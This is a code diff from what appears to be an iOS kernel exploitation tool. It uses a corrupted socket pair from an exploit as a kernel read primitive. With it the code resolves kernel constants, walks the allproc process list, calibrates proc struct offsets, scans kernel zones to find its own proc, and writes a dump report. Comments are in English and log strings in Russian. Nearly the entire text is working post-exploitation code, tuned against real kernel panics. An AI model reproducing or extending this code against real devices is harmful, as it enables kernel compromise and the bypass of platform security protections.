+        [[KPLog shared] appendFormat:@"  gPhysSize: raw=0x%016llx strip=0x%016llx%s",
+            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не размер — не сохраняю)"];
+    }
+    v = 0;
+    if (kpRead(ksymbol(cpu_ttep), &v, sizeof(v), "cpu_ttep", scratch)) {
+        // TTBR: ASID in bits 63:48, phys base in 47:0 (mask only, no sign ext).
+        uint64_t ttbrPhys = v & 0x0000ffffffffffffULL;
+        uint64_t vaForm = kp_untag_ptr(v);
+        gCpuTtepVA = vaForm;
+        gCpuTtepPhys = ttbrPhys;
+        gSystemInfo.kernelConstant.cpuTTEP = ttbrPhys;
+        [[KPLog shared] appendFormat:@"  cpu_ttep: raw=0x%016llx ttbr-phys=0x%016llx va-формой=0x%016llx",
+            (unsigned long long)v, (unsigned long long)ttbrPhys, (unsigned long long)vaForm];
+    }
+
+    // EXP-02: SPTM/TXM runtime bases — DEBG fast path, then pointer-vote.
+    [self harvestSptmTxmBasesWithLog:scratch];
+
+    [[KPLog shared] appendFormat:@"  base=%#llx virtBase=%#llx physBase=%#llx physSize=%#llx cpuTTEP=%#llx sptmBase=%#llx sptmSlide=%#llx txmBase=%#llx txmSlide=%#llx",
+        kconstant(base), kconstant(virtBase), kconstant(physBase), kconstant(physSize),
+        kconstant(cpuTTEP), kconstant(sptmBase), kconstant(sptmSlide), kconstant(txmBase), kconstant(txmSlide)];
+}
+
+#pragma mark - EXP-01: fixed allproc (multi-route, verified per hop)
+
+static uint64_t gAllprocHead = 0;
+static uint32_t gCommOff = 0;
+static uint32_t gPidOff = 0;
+static uint64_t gSelfProcVA = 0;
+
+// A node holds a comm string when its window contains it as a C-string.
+static BOOL kpNodeHasComm(const uint8_t *window, size_t size, const char *comm, uint32_t *offOut)
+{
+    size_t clen = strlen(comm) + 1;
+    for (size_t i = 0; i + clen <= size; i++) {
+        if (memcmp(window + i, comm, clen) == 0) {
+            *offOut = (uint32_t)i;
+            return YES;
+        }
+    }
+    return NO;
+}
+
+// Walk a candidate list head (p_list links at proc+0/+8, per the ladder).
+// Returns the VA of the node whose window holds "kernel_task", or 0. Every
+// hop is PAC-stripped and sanity-checked before following.
+static uint64_t kpWalkCandidateHead(uint64_t head, NSMutableString *r, uint32_t *commOffOut)
+{
+    if (!kpLooksLikeKernelPointer(head)) return 0;
+    uint64_t node = head, prev = 0;
+    for (int n = 0; n < 64 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
+        // 1.4.3: a garbage-but-in-range head fed the walk into unmapped memory
+        // and panicked the kernel at candidate #68 (previous run). Prove the
+        // node is backed by a physical page before any read; a dead link ends
+        // the walk quietly instead of panicking.
+        if ((gCpuTtepVA || gCpuTtepPhys) && kvtophys(node) == 0) return 0;
+        uint8_t window[0x400];
+        memset(window, 0, sizeof(window));
+        // 1.5.4: the gate above proved only the FIRST page. The 0x400 window
+        // crosses the 16K page end for nodes past page offset 0x3c00 —
+        // candidate #65 (head 0xffffffe267fdbd60, page offset 0x3d60) read
+        // 0x160 bytes into an unmapped physmap page and panicked the kernel
+        // inside getsockopt. Prove the last byte too, else clamp the window
+        // to the 16K page end.
+        size_t winSize = sizeof(window);
+        if ((gCpuTtepVA || gCpuTtepPhys) && kvtophys(node + winSize - 1) == 0) {
+            uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
+            winSize = (size_t)(pageEnd - node);
+        }
+        if (!kpRead(node, window, winSize, "list node", r)) return 0;
+        // Back-link validation: node's le_prev must address prev's le_next —
+        // for proc, le_next is at offset 0, so le_prev == prev exactly.
+        if (n > 0) {
+            uint64_t backRaw = 0;
+            memcpy(&backRaw, window + koffsetof(proc, list_prev), sizeof(backRaw));
+            if (kp_untag_ptr(backRaw) != prev) return 0;
+        }
+        uint32_t off = 0;
+        if (kpNodeHasComm(window, sizeof(window), "kernel_task", &off)) {
+            *commOffOut = off;
+            return node;
+        }
+        uint64_t nextRaw = 0;
+        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
+        prev = node;
+        node = kp_untag_ptr(nextRaw);
+    }
+    return 0;
+}
+
+// Calibrate p_pid using the three known pids: kernel_task=0, launchd=1,
+// ourselves=getpid(). Finds the 4-aligned offset matching all three; prefers
+// the ladder value (0x60 on 18.6). No offset is trusted a priori.
++ (void)calibratePidOffset:(NSMutableString *)r
+{
+    if (!gAllprocHead || !gCommOff) return;
+
+    const char *myName = getprogname();
+    uint64_t ktVA = 0, launchdVA = 0, selfVA = 0;
+    uint64_t node = gAllprocHead, prev = 0;
+    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev && (!ktVA || !launchdVA || !selfVA); n++) {
+        uint8_t window[0x400];
+        memset(window, 0, sizeof(window));
+        // 1.5.4: same page-tail rule as the candidate walk — clamp the read
+        // window when the 16K page behind the node is unmapped.
+        size_t winSize = sizeof(window);
+        if ((gCpuTtepVA || gCpuTtepPhys)) {
+            if (kvtophys(node) == 0) break;
+            if (kvtophys(node + winSize - 1) == 0) {
+                uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
+                winSize = (size_t)(pageEnd - node);
+            }
+        }
+        if (!kpRead(node, window, winSize, "calib node", r)) break;
+        uint32_t dummy = 0;
+        if (!ktVA && kpNodeHasComm(window, sizeof(window), "kernel_task", &dummy)) ktVA = node;
+        if (!launchdVA && gCommOff && gCommOff + 32 <= winSize &&
+            memcmp(window + gCommOff, "launchd", 8) == 0) launchdVA = node;
+        if (!selfVA && gCommOff && gCommOff + strlen(myName) + 1 <= winSize &&
+            memcmp(window + gCommOff, myName, strlen(myName) + 1) == 0) selfVA = node;
+        uint64_t nextRaw = 0;
+        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
+        prev = node;
+        node = kp_untag_ptr(nextRaw);
+        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  калибровка pid: обошли %d узлов…", n + 1]);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  калибровка: kernel_task=%#llx launchd=%#llx self=%#llx",
+              (unsigned long long)ktVA, (unsigned long long)launchdVA, (unsigned long long)selfVA]);
+    if (!ktVA || !launchdVA) {
+        kpNote(r, @"  калибровка pid: не нашли kernel_task/launchd — остаёмся на оффсете лестницы");
+        gPidOff = koffsetof(proc, pid);
+        return;
+    }
+
+    // Solve: kt[off]==0 && launchd[off]==1 (&& self[off]==getpid() when found)
+    uint32_t ladder = koffsetof(proc, pid);
+    NSMutableArray<NSNumber *> *matches = [NSMutableArray array];
+    for (uint32_t off = 0; off + 4 <= 0x400; off += 4) {
+        uint32_t v0 = 0, v1 = 0, vSelf = 0;
+        uint8_t tmp[4];
+        if (!kpRead(ktVA + off, tmp, 4, "calib read", r)) break;      v0 = *(uint32_t *)tmp;
+        if (v0 != 0) continue;
+        if (!kpRead(launchdVA + off, tmp, 4, "calib read", r)) break; v1 = *(uint32_t *)tmp;
+        if (v1 != 1) continue;
+        if (selfVA) {
+            if (!kpRead(selfVA + off, tmp, 4, "calib read", r)) break; vSelf = *(uint32_t *)tmp;
+            if (vSelf != (uint32_t)getpid()) continue;
+        }
+        [matches addObject:@(off)];
+    }
+    if (matches.count == 0) {
+        kpNote(r, @"  калибровка pid: ни один оффсет не сошёлся — лестница (0x60) под вопросом");
+        gPidOff = ladder;
+        return;
+    }
+    BOOL ladderOK = [matches containsObject:@(ladder)];
+    gPidOff = ladderOK ? ladder : matches.firstObject.unsignedIntValue;
+    kpNote(r, [NSString stringWithFormat:@"  p_pid оффсеты-кандидаты: %@%s; выбран 0x%x",
+              [matches componentsJoinedByString:@","], ladderOK ? " (лестница среди них)" : " (лестницы НЕТ среди них)", gPidOff]);
+}
+
+// Walk the fixed chain matching our own comm — independent of p_pid.
++ (uint64_t)findSelfProcByComm:(NSMutableString *)r
+{
+    if (gSelfProcVA) return gSelfProcVA;
+    if (!gAllprocHead || !gCommOff) return 0;
+    const char *myName = getprogname();
+    size_t myLen = strlen(myName) + 1;
+    uint64_t node = gAllprocHead, prev = 0;
+    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
+        uint8_t window[0x400];
+        memset(window, 0, sizeof(window));
+        // 1.5.4: page-tail clamp, same as the candidate walk.
+        size_t winSize = sizeof(window);
+        if ((gCpuTtepVA || gCpuTtepPhys)) {
+            if (kvtophys(node) == 0) return 0;
+            if (kvtophys(node + winSize - 1) == 0) {
+                uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
+                winSize = (size_t)(pageEnd - node);
+            }
+        }
+        if (!kpRead(node, window, winSize, "self scan", r)) return 0;
+        if (gCommOff + myLen <= winSize && memcmp(window + gCommOff, myName, myLen) == 0) {
+            gSelfProcVA = node;
+            kpNote(r, [NSString stringWithFormat:@"  наш proc по comm: %#llx (pid=%d)", node, getpid()]);
+            return node;
+        }
+        uint64_t nextRaw = 0;
+        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
+        prev = node;
+        node = kp_untag_ptr(nextRaw);
+        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  …обошли %d узлов, ищем \"%s\"", n + 1, myName]);
+    }
+    kpNote(r, @"  наш proc по comm не найден");
+    return 0;
+}
+
++ (uint64_t)resolveAllprocHeadWithLog:(NSMutableString *)r
+{
+    if (gAllprocHead) return gAllprocHead;
+    uint64_t sym = ksymbol(allproc);
+    if (!sym) {
+        kpNote(r, @"  allproc: ключ не найден в словаре оффсетов — пропуск");
+        return 0;
+    }
+
+    // Candidate list heads (runtime VAs), most likely first:
+    //  A/B: the XPF anchor pair. Field result on 18.6: both read 0. Static
+    //       analysis shows that pair takes inserts of a proc+0x6a0-pointed
+    //       object — i.e. it is the pgrp/session list, NOT allproc.
+    //  C/D: an alternate adjacent LIST_HEAD pair from static analysis of this
+    //       exact kernelcache (proc-code region, +0/+8 links).
+    // 1.5.2: ordered set — walk each head once, ever.
+    // 1.5.7: the ±0x200 drift scan is DEAD. Three runs, ~230 candidate walks,
+    // zero kernel_task hits — the XPF allproc anchor is wrong on 18.6, and
+    // every garbage walk burns thousands of kreads through the corrupted
+    // inpcb until a zone bound check panics the kernel (panics at candidates
+    // #65/#94, zalloc.c:1308/829). 4 static candidates, then straight to the
+    // zone route, which starts from OUR OWN proc — a real object.
+    NSMutableOrderedSet<NSNumber *> *cands = [NSMutableOrderedSet orderedSet];
+    if (kconstant(slide)) {
+        [cands addObject:@(kconstant(slide) + 0xfffffff00aaded50ULL)];
+        [cands addObject:@(kconstant(slide) + 0xfffffff00aaded58ULL)];
+    }
+    [cands addObject:@(sym)];
+    [cands addObject:@(sym + 8)];
+
+    const char *names[] = { "C (static 0xaaded50)", "D (static 0xaaded58)" };
+    int idx = 0;
+    for (NSNumber *candAddr in cands) {
+        uint64_t headAddr = candAddr.unsignedLongLongValue;
+        uint64_t raw = 0;
+        if (!kpRead(headAddr, &raw, sizeof(raw), "head candidate", r)) { idx++; continue; }
+        if (!raw) { idx++; continue; }
+        uint64_t head = kp_untag_ptr(raw);
+        if (!kpLooksLikeKernelPointer(head)) { idx++; continue; }
+        kpNote(r, [NSString stringWithFormat:@"  кандидат #%d @ %#llx: head=0x%016llx — идём по цепочке",
+                  idx, (unsigned long long)headAddr, (unsigned long long)head]);
+        uint32_t commOff = 0;
+        uint64_t ktNode = kpWalkCandidateHead(head, r, &commOff);
+        if (ktNode) {
+            gAllprocHead = head;
+            gCommOff = commOff;
+            const char *tag = idx < 2 ? names[idx] : (idx == 2 ? "A (XPF 0xaaa2608)" : (idx == 3 ? "B (XPF 0xaaa2610)" : "E (drift)"));
+            kpNote(r, [NSString stringWithFormat:@"  EXP-01: allproc = голова %s @ %#llx; kernel_task @ %#llx; p_comm=+0x%x",
+                      tag, (unsigned long long)headAddr, (unsigned long long)ktNode, gCommOff]);
+            [self calibratePidOffset:r];
+            return gAllprocHead;
+        }
+        idx++;
+    }
+    kpNote(r, @"  EXP-01: кандидаты исчерпаны — перехожу к zone-маршруту");
+
+    // Zone route gives us OUR proc. From it, walk BACKWARD via le_prev (+8):
+    // each element's le_prev is the previous element's VA (le_next lives at
+    // offset 0); the first element's le_prev points at the head global in
+    // __DATA (kernel image region). That recovers the allproc head itself.
+    uint64_t selfProc = [self zoneRouteSelfProcWithLog:r];
+    if (!selfProc) {
+        kpNote(r, @"  EXP-01: zone-маршрут не дал proc — allproc недоступен");
+        return 0;
+    }
+    gSelfProcVA = selfProc;
+
+    uint64_t node = selfProc, prev = 0;
+    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
+        uint64_t prevRaw = 0;
+        if (!kpRead(node + koffsetof(proc, list_prev), &prevRaw, sizeof(prevRaw), "le_prev", r)) break;
+        uint64_t prevp = kp_untag_ptr(prevRaw);
+        if (prevp >= kconstant(base) && prevp < kconstant(base) + 0x30000000ULL) {
+            // head-global candidate: its value is the first element
+            uint64_t firstElRaw = 0;
+            if (kpRead(prevp, &firstElRaw, sizeof(firstElRaw), "head.lh_first", r)) {
+                uint64_t firstEl = kp_untag_ptr(firstElRaw);
+                if (kpLooksLikeKernelPointer(firstEl)) {
+                    uint32_t commOff = gCommOff;
+                    uint64_t ktNode = kpWalkCandidateHead(firstEl, r, &commOff);
+                    if (ktNode) {
+                        gAllprocHead = firstEl;
+                        gCommOff = commOff;
+                        kpNote(r, [NSString stringWithFormat:@"  EXP-01: allproc head восстановлен @ %#llx (zone-маршрут), kernel_task @ %#llx",
+                                  (unsigned long long)prevp, (unsigned long long)ktNode]);
+                        [self calibratePidOffset:r];
+                        return gAllprocHead;
+                    }
+                }
+            }
+        }
+        prev = node;
+        node = prevp;
+        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  …назад по цепочке: %d узлов", n + 1]);
+    }
+    kpNote(r, @"  EXP-01: наш proc есть, но голова списка не восстановлена — дамп ограничен");
+    return 0;
+}
+
+// Walk the fixed allproc chain to a pid. Small windows for speed; progress
+// logged every 64 nodes. Returns the proc VA or 0.
++ (uint64_t)findProcByPid:(uint32_t)pid log:(NSMutableString *)r
+{
+    uint64_t head = [self resolveAllprocHeadWithLog:r];
+    if (!head) return 0;
+    uint32_t pidOff = gPidOff ? gPidOff : koffsetof(proc, pid);
+
+    uint64_t node = head, prev = 0;
+    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
+        uint8_t window[0x100];
+        memset(window, 0, sizeof(window));
+        if (!kpRead(node, window, sizeof(window), "proc scan", r)) return 0;
+        uint32_t nodePid = 0;
+        memcpy(&nodePid, window + pidOff, sizeof(nodePid));
+        if (nodePid == pid) {
+            char comm[33] = {0};
+            if (gCommOff) {
+                uint8_t full[0x400];
+                memset(full, 0, sizeof(full));
+                if (kpRead(node, full, sizeof(full), "proc full", r)) {
+                    memcpy(comm, full + gCommOff, 32);
+                }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  найден proc pid=%u @ %#llx comm=\"%s\"", pid, node, comm]);
+            return node;
+        }
+        if ((n & 0x3F) == 0x3F) {
+            kpNote(r, [NSString stringWithFormat:@"  …обошли %d процессов, ищем pid %u", n + 1, pid]);
+        }
+        uint64_t nextRaw = 0;
+        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
+        prev = node;
+        node = kp_untag_ptr(nextRaw);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  pid %u не найден в allproc", pid]);
+    return 0;
+}
+
+// 1.9.1: fast pid-walk. The zone guard kills LONG walks because every kpRead
+// is ~6-8 primitive calls on the corrupted socket pair (kvtophys gates) and
+// every 0x100 window is 8 chunk-reads on top — a 512-node walk was thousands
+// of zone ops. Here: one gated head read, then 2 direct field reads per node
+// (pid @ +0x60, le_next @ +0). The chain is live zone memory; sanity is the
+// kernel-pointer check + prev-node loop guard.
+// E10 (field data): launchd (pid 1) sits at the TAIL of allproc — fork
+// inserts at head, so the newest proc (us) is node 0 and pid 1 is several
+// hundred nodes deep. Cap raised 256 → 2048 to reach the tail; progress is
+// logged every 256 nodes; a >1900-consecutive-nodes-without-find fuse breaks
+// just short of the cap (fast walk is safe — 2 raw reads per node on a live
+// chain, no zone-route gates); a broken chain (garbage next / loop) is
+// logged, not followed.
+#define KP_FAST_WALK_MAX_NODES   2048
+#define KP_FAST_WALK_NOFIND_FUSE 1900
++ (uint64_t)findSelfProcByPidFast:(uint32_t)pid log:(NSMutableString *)r
+{
+    uint64_t sym = ksymbol(allproc);
+    if (!sym) return 0;
+    uint64_t head = 0;
+    if (!kpRead(sym, &head, sizeof(head), "allproc head", r)) return 0;
+    head = kp_untag_ptr(head);
+    if (!kpLooksLikeKernelPointer(head)) return 0;
+    uint32_t pidOff = gPidOff ? gPidOff : koffsetof(proc, pid);
+    uint64_t node = head, prev = 0;
+    for (int n = 0; n < KP_FAST_WALK_MAX_NODES; n++) {
+        if (!kpLooksLikeKernelPointer(node) || node == prev) {
+            kpNote(r, [NSString stringWithFormat:@"  …fast walk: цепь оборвалась на узле %d (pid %u не найден)", n, pid]);
+            return 0;
+        }
+        uint32_t nodePid = 0;
+        kreadbuf(node + pidOff, &nodePid, sizeof(nodePid));
+        if (nodePid == pid) {
+            kpNote(r, [NSString stringWithFormat:@"  наш proc по pid %u @ %#llx (fast walk, узлов=%d)", pid, node, n]);
+            return node;
+        }
+        if ((n & 0xFF) == 0xFF) {
+            kpNote(r, [NSString stringWithFormat:@"  …fast walk: %d узлов, ищем pid %u", n + 1, pid]);
+        }
+        if (n >= KP_FAST_WALK_NOFIND_FUSE) {
+            kpNote(r, [NSString stringWithFormat:@"  …fast walk: %d узлов подряд без находки (pid %u) — досрочный break, ядро важнее", n + 1, pid]);
+            return 0;
+        }
+        uint64_t next = 0;
+        kreadbuf(node, &next, sizeof(next));
+        prev = node;
+        node = kp_untag_ptr(next);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  …fast walk: лимит %d узлов исчерпан, pid %u не найден", KP_FAST_WALK_MAX_NODES, pid]);
+    return 0;
+}
+
+#pragma mark - EXP-01 fallback: zone-name route to our proc
+
+// Verify an inpcb VA belongs to us: our process name sits in inp_last_comm
+// (the exploit used the same oracle to corrupt this socket).
+static BOOL kpInpcbLooksOurs(uint64_t inpcbVA, NSMutableString *r)
+{
+    uint8_t win[0x400];
+    memset(win, 0, sizeof(win));
+    if (!kpRead(inpcbVA, win, sizeof(win), "inpcb window", r)) return NO;
+    const char *me = getprogname();
+    BOOL found = NO;
+    size_t myLen = strlen(me) + 1;
+    for (size_t i = 0; i + myLen <= sizeof(win); i++) {
+        if (memcmp(win + i, me, myLen) == 0) { found = YES; break; }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  inpcb %#llx содержит наш comm: %s",
+              (unsigned long long)inpcbVA, found ? "да" : "НЕТ"]);
+    return found;
+}
+
+// Zone route: inpcb → pcbinfo → zone("inpcb") → calibrate z_name → scan for
+// zone "proc" → walk its page queue → find our proc by comm → validate via
+// the proc_ro→ucred→cr_uid == getuid() hop. Fully content-calibrated; no
+// zone/proc offsets are trusted a priori.
++ (uint64_t)zoneRouteSelfProcWithLog:(NSMutableString *)r
+{
+    kpNote(r, @"  EXP-01 fallback: zone-маршрут (inpcb → зона «inpcb» → зона «proc» → наш proc)");
+    uint64_t inpcbVA = darksword_control_socket_pcb() ? darksword_control_socket_pcb() : darksword_rw_socket_pcb();
+    if (!inpcbVA) {
+        kpNote(r, @"  нет pcb адреса в контексте эксплойта — выход");
+        return 0;
+    }
+    if (!kpInpcbLooksOurs(inpcbVA, r)) {
+        kpNote(r, @"  inpcb без нашего comm — маршрут не доверен, выход");
+        return 0;
+    }
+
+    uint64_t raw = 0;
+    if (!kpRead(inpcbVA + koffsetof(inpcb, pcbinfo), &raw, sizeof(raw), "inpcb.pcbinfo", r)) return 0;
+    uint64_t pcbinfo = kp_untag_ptr(raw);
+    kpNote(r, [NSString stringWithFormat:@"  pcbinfo: raw=0x%016llx → 0x%016llx", (unsigned long long)raw, (unsigned long long)pcbinfo]);
+    if (!kpLooksLikeKernelPointer(pcbinfo)) return 0;
+
+    raw = 0;
+    if (!kpRead(pcbinfo + koffsetof(inpcbinfo, ipi_zone), &raw, sizeof(raw), "inpcbinfo.ipi_zone", r)) return 0;
+    uint64_t zoneInpcb = kp_untag_ptr(raw);
+    kpNote(r, [NSString stringWithFormat:@"  zone(inpcb): raw=0x%016llx → 0x%016llx", (unsigned long long)raw, (unsigned long long)zoneInpcb]);
+    if (!kpLooksLikeKernelPointer(zoneInpcb)) return 0;
+
+    // Calibrate z_name offset in struct zone: find the qword whose pointee
+    // reads "inpcb".
+    uint32_t zNameOff = 0;
+    BOOL calibrated = NO;
+    {
+        uint8_t zw[0x400];
+        memset(zw, 0, sizeof(zw));
+        if (!kpRead(zoneInpcb, zw, sizeof(zw), "zone struct", r)) return 0;
+        for (uint32_t off = 0; off + 8 <= sizeof(zw); off += 8) {
+            uint64_t q = 0;
+            memcpy(&q, zw + off, 8);
+            uint64_t cand = kp_untag_ptr(q);
+            if (!kpLooksLikeKernelPointer(cand)) continue;
+            uint8_t strBuf[32];
+            memset(strBuf, 0, sizeof(strBuf));
+            if (!kpRead(cand, strBuf, sizeof(strBuf), "z_name candidate", r)) continue;
+            if (memcmp(strBuf, "inpcb", 6) == 0) {
+                zNameOff = off;
+                calibrated = YES;
+                kpNote(r, [NSString stringWithFormat:@"  z_name offset в struct zone: +0x%x (строка @ %#llx)", off, (unsigned long long)cand]);
+                break;
+            }
+        }
+    }
+    if (!calibrated) {
+        kpNote(r, @"  z_name offset не откалиброван — выход");
+        return 0;
+    }
+
+    // Scan ±64 pages around the inpcb zone struct for a zone named "proc".
+    uint64_t procZone = 0;
+    uint64_t scanBase = zoneInpcb & ~0x3FFFULL;
+    NSMutableString *zoneNames = [NSMutableString string];
+    for (int64_t pg = -64; pg <= 64 && !procZone; pg++) {
+        uint64_t pageVA = scanBase + pg * 0x4000;
+        for (uint64_t off = 0; off < 0x4000 && !procZone; off += 0x400) {
+            uint8_t win[0x400];
+            memset(win, 0, sizeof(win));
+            if (!kpRead(pageVA + off, win, sizeof(win), "zone page", r)) break;
+            for (uint32_t q = 0; q + 8 <= sizeof(win); q += 8) {
+                uint64_t qv = 0;
+                memcpy(&qv, win + q, 8);
+                uint64_t cand = kp_untag_ptr(qv);
+                if (!kpLooksLikeKernelPointer(cand)) continue;
+                // zone names live in the kernel __TEXT cstring region
+                if (cand < kconstant(base) || cand >= kconstant(base) + 0x1000000) continue;
+                uint8_t strBuf[32];
+                memset(strBuf, 0, sizeof(strBuf));
+                if (!kpRead(cand, strBuf, sizeof(strBuf), "zone name", r)) continue;
+                if (strBuf[0] < 0x20 || strBuf[0] > 0x7e) continue;
+                BOOL printable = YES;
+                int len = 0;
+                for (int c = 0; c < 31; c++) {
+                    if (strBuf[c] == 0) { len = c; break; }
+                    if (strBuf[c] < 0x20 || strBuf[c] > 0x7e) { printable = NO; break; }
+                }
+                if (!printable || len < 3) continue;
+                [zoneNames appendFormat:@"%s@q%#llx ", (char *)strBuf, (unsigned long long)(pageVA + off + q)];
+                if (memcmp(strBuf, "proc", 5) == 0) {
+                    procZone = pageVA + off + q - zNameOff;
+                    break;
+                }
+            }
+        }
+    }
+    if (zoneNames.length) kpNote(r, [NSString stringWithFormat:@"  зоны рядом: %@", zoneNames]);
+    if (!procZone) {
+        kpNote(r, @"  зона «proc» не найдена в ±64 страницах — выход");
+        return 0;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  зона «proc» @ %#llx", (unsigned long long)procZone]);
+
+    // Find the page-queue head field by content: a queue head {next,prev}
+    // where next strips to a kernel VA and *(next+8) strips back to &field.
+    uint32_t pageqOff = 0;
+    {
+        uint8_t zw[0x400];
+        memset(zw, 0, sizeof(zw));
+        if (!kpRead(procZone, zw, sizeof(zw), "proc zone struct", r)) return 0;
+        for (uint32_t off = 0; off + 8 <= sizeof(zw); off += 8) {
+            uint64_t q = 0;
+            memcpy(&q, zw + off, 8);
+            uint64_t next = kp_untag_ptr(q);
+            if (!kpLooksLikeKernelPointer(next)) continue;
+            uint64_t backRaw = 0;
+            if (!kpRead(next + 8, &backRaw, sizeof(backRaw), "queue back-ptr", r)) continue;
+            if (kp_untag_ptr(backRaw) == procZone + off) {
+                pageqOff = off;
+                kpNote(r, [NSString stringWithFormat:@"  z_pageq offset в proc-зоне: +0x%x (next=%#llx)", off, (unsigned long long)next]);
+                break;
+            }
+        }
+    }
+    if (!pageqOff) {
+        kpNote(r, @"  page-queue голова не найдена — выход");
+        return 0;
+    }
+
+    // Walk zone pages; scan each for our comm; validate via ucred hop.
+    const char *myName = getprogname();
+    size_t myLen = strlen(myName) + 1;
+    uint64_t zpage = 0;
+    {
+        uint64_t q = 0;
+        if (!kpRead(procZone + pageqOff, &q, sizeof(q), "z_pageq first", r)) return 0;
+        zpage = kp_untag_ptr(q);
+    }
+    uint64_t procVA = 0;
+    for (int zp = 0; zp < 512 && kpLooksLikeKernelPointer(zpage) && !procVA; zp++) {
+        uint64_t pageBase = zpage & ~0x3FFFULL;
+        for (uint64_t off = 0; off < 0x4000 && !procVA; off += 0x400) {
+            uint8_t win[0x400];
+            memset(win, 0, sizeof(win));
+            if (!kpRead(pageBase + off, win, sizeof(win), "proc page", r)) break;
+            for (uint32_t q = 0; q + myLen <= sizeof(win); q++) {
+                if (memcmp(win + q, myName, myLen) != 0) continue;
+                // hit: find the containing element (stride 0x740 from pageBase)
+                uint64_t hitVA = pageBase + off + q;
+                for (uint64_t elem = pageBase; elem + 0x740 <= pageBase + 0x4000; elem += 0x740) {
+                    if (hitVA < elem || hitVA >= elem + 0x740) continue;
+                    // validate candidate: proc → proc_ro(+0x18) → ucred(+0x28) → uid(+0x18) == getuid()
+                    uint64_t roRaw = 0, credRaw = 0;
+                    if (!kpRead(elem + koffsetof(proc, proc_ro), &roRaw, sizeof(roRaw), "cand proc_ro", r)) break;
+                    uint64_t ro = kp_untag_ptr(roRaw);
+                    if (!kpLooksLikeKernelPointer(ro)) break;
+                    if (!kpRead(ro + koffsetof(proc_ro, ucred), &credRaw, sizeof(credRaw), "cand ucred", r)) break;
+                    uint64_t cred = kp_untag_ptr(credRaw);
+                    if (!kpLooksLikeKernelPointer(cred)) break;
+                    uint32_t uid = 0;
+                    if (!kpRead(cred + 0x18, &uid, sizeof(uid), "cand cr_uid", r)) break;
+                    kpNote(r, [NSString stringWithFormat:@"  кандидат proc %#llx (hit @ %#llx): uid=%u (ждём uid=%d)",
+                              (unsigned long long)elem, (unsigned long long)hitVA, uid, getuid()]);
+                    if (uid == (uint32_t)getuid()) {
+                        procVA = elem;
+                        gCommOff = (uint32_t)(hitVA - elem);
+                        kpNote(r, [NSString stringWithFormat:@"  НАШ proc @ %#llx (ucred-hop подтверждён; p_comm=+0x%x)",
+                                  (unsigned long long)procVA, gCommOff]);
+                        break;
+                    }
+                }
+                if (procVA) break;
+            }
+        }
+        // next zpage
+        uint64_t q = 0;
+        if (!kpRead(zpage, &q, sizeof(q), "zpage next", r)) break;
+        uint64_t next = kp_untag_ptr(q);
+        if (next == kp_untag_ptr(zpage) || !next) break;
+        zpage = next;
+        if ((zp & 0x1F) == 0x1F) kpNote(r, [NSString stringWithFormat:@"  …обошли %d страниц proc-зоны", zp + 1]);
+    }
+    if (!procVA) {
+        kpNote(r, @"  наш proc не найден в proc-зоне — выход");
+    }
+    return procVA;
+}
+
+static void kpDumpProc(NSMutableString *report, const char *label, uint64_t proc, uint32_t commOff)
+{
+    if (!kpLooksLikeKernelPointer(proc)) {
+        kpNote(report, [NSString stringWithFormat:@"  %s: некорректный указатель proc %#llx — пропуск", label, proc]);
+        return;
+    }
+
+    uint8_t window[0x400];
+    if (!kpRead(proc, window, sizeof(window), label, report)) return;
+
+    uint32_t pidOff = gPidOff ? gPidOff : koffsetof(proc, pid);
+    uint32_t pid = 0;
+    memcpy(&pid, window + pidOff, sizeof(pid));
+
+    char comm[33] = {0};
+    if (commOff && commOff + 32 <= sizeof(window)) {
+        memcpy(comm, window + commOff, 32);
+    }
+
+    kpNote(report, [NSString stringWithFormat:@"  %s proc=%#llx pid=%u comm=\"%s\"", label, proc, pid, comm]);
+}
+
++ (NSString *)buildReport
+{
+    KPLog *log = [KPLog shared];
+    NSMutableString *r = [NSMutableString string];
+
+    struct utsname u;
+    uname(&u);
+    NSISO8601DateFormatter *iso = [[NSISO8601DateFormatter alloc] init];
+
+    // 1.5.9: incremental dump. The report file is appended after every section
+    // and fsync'd, so a kernel panic mid-dump keeps everything gathered so far
+    // (previously the report existed only as one write at the very end).
+    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+    NSString *dumpPath = [docs stringByAppendingPathComponent:@"kexproof-dump.txt"];
+    [[NSFileManager defaultManager] removeItemAtPath:dumpPath error:nil];
+    [[NSFileManager defaultManager] createFileAtPath:dumpPath contents:nil attributes:nil];
+    NSFileHandle *dumpFH = [NSFileHandle fileHandleForWritingAtPath:dumpPath];
+    __block NSUInteger flushedUpTo = 0;
+    void (^flush)(void) = ^{
+        if (!dumpFH || r.length <= flushedUpTo) return;
+        @try {
+            NSString *delta = [r substringFromIndex:flushedUpTo];
+            flushedUpTo = r.length;
+            [dumpFH seekToEndOfFile];
+            [dumpFH writeData:[delta dataUsingEncoding:NSUTF8StringEncoding]];
+            [dumpFH synchronizeFile];
+        } @catch (NSException *ignored) {}
+    };
+
+    void (^section)(NSString *) = ^(NSString *title) {
+        flush();  // everything gathered since the previous section hits disk now
+        kpNote(r, [NSString stringWithFormat:@"\n--- %@ ---", title]);
+    };
+    void (^kv)(NSString *, NSString *) = ^(NSString *key, NSString *val) {
